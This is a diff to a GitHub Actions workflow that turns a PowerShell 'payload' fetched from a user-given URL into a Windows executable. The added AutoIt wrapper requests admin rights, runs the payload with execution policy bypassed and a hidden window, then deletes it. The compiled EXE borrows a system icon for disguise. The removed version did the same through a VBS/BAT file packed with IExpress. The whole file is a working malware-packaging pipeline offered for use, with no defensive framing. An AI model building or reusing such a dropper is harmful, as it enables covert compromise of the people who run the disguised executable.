@@ -1,4 +1,4 @@
-name: Convert VBS to EXE (Fully Embedded)
+name: Convert Script to EXE (AutoIt)
 
 on:
   workflow_dispatch:
@@ -17,45 +17,44 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    # Step 2: Fetch PowerShell Payload
+    # Step 2: Install AutoIt
+    - name: Install AutoIt
+      shell: powershell
+      run: |
+        Invoke-WebRequest -Uri "https://www.autoitscript.com/autoit3/scite/download/AutoItFullInstallation.exe" -OutFile "AutoItInstaller.exe"
+        Start-Process -FilePath "AutoItInstaller.exe" -ArgumentList "/S" -Wait
+
+    # Step 3: Fetch PowerShell Payload
     - name: Fetch PowerShell Payload
       shell: powershell
       run: |
         Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.ps1'
         if (!(Test-Path "payload.ps1")) { Write-Host "Payload script missing!"; exit 1 }
 
-    # Step 3: Create Embedded BAT Wrapper
-    - name: Create BAT File
+    # Step 4: Create AutoIt Wrapper
+    - name: Create AutoIt Script
+      shell: powershell
+      run: |
+        Set-Content -Path "payload.au3" -Value @"
+        #RequireAdmin
+        $script = @TempDir & "\payload.ps1"
+        FileWrite($script, '$(Get-Content -Raw payload.ps1)')
+        RunWait('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' & $script & '"', @TempDir, @SW_HIDE)
+        FileDelete($script)
+        "@
+
+    # Step 5: Compile AutoIt Script to EXE
+    - name: Compile AutoIt to EXE
       shell: cmd
       run: |
-        echo @echo off > payload.bat
-        echo echo Creating VBS File... >> payload.bat
-        echo echo Set objShell = CreateObject("WScript.Shell") > payload.vbs >> payload.bat
-        echo echo objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File %~dp0payload.ps1", 0, False >> payload.bat
-        echo wscript.exe payload.vbs >> payload.bat
+        "C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2Exe.exe" /in payload.au3 /out payload.exe /icon "C:\Windows\System32\shell32.dll"
 
-    # Step 4: Convert BAT to EXE using IExpress
-    - name: Create EXE with IExpress
-      shell: cmd
-      run: |
-        echo [Version] > package.sed
-        echo Class=IEXPRESS >> package.sed
-        echo [Options] >> package.sed
-        echo UseLongFileName=1 >> package.sed
-        echo [Strings] >> package.sed
-        echo InstallCommand=payload.bat >> package.sed
-        echo FILE0=payload.bat >> package.sed
-        echo [SourceFiles] >> package.sed
-        echo SourceFiles0=. >> package.sed
-        echo [Files] >> package.sed
-        echo %FILE0% >> package.sed
-        iexpress /N /Q package.sed
-
-    # Step 5: Upload the EXE
+    # Step 6: Upload the EXE
     - name: Upload EXE
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
-        path: package.exe
+        path: payload.exe
+
 
 
